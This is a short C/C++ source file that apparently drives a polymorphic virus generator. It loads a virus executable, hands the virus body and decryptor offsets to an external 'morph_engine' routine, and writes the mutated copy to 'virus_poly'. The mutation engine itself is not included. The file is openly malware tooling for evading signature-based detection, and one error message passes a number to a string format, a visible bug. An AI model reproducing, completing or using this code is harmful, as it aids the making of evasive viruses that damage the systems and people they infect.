
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include<iostream>
#include <fstream>

extern "C" int morph_engine(char* exe_data, size_t virus_beg_offset, size_t virus_size, size_t dec_offset);
using namespace std;
int main(int argc, char* argv[])
{


    if(argc != 5) {

        cout << "Invalid number of arguments!" << endl;
        return 1;
    }

	srand(time(NULL));

	// get the arguments
	const char* virus_name = argv[1];
	const size_t virus_offset  = strtol(argv[2], nullptr, 16);
	const size_t virus_size    = strtol(argv[3], nullptr, 16);
	const size_t dec_offset  = strtol(argv[4], nullptr, 16);


	// open the executable file
	FILE* exe_file = fopen(virus_name, "rb");
	if(!exe_file)
	{
		printf("Failed to open %s\n", virus_offset);
		return -1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);


    char* exe_data =  (char *) malloc(exe_size);
    fread(exe_data, exe_size, 1, exe_file);
    if(morph_engine(exe_data, virus_offset, virus_size, dec_offset) != 0)
	{
		printf("An error occured in the morph engine\n");

	}


    std::ofstream outfile ("virus_poly",std::ofstream::binary);
    // write to outfile
    outfile.write (exe_data,exe_size);



    return 0;
}

// https://stackoverflow.com/questions/22129349/reading-binary-file-to-unsigned-char-array-and-write-it-to-another
// https://stackoverflow.com/questions/43765881/c-reading-binary-files
// http://www.cplusplus.com/forum/beginner/176692/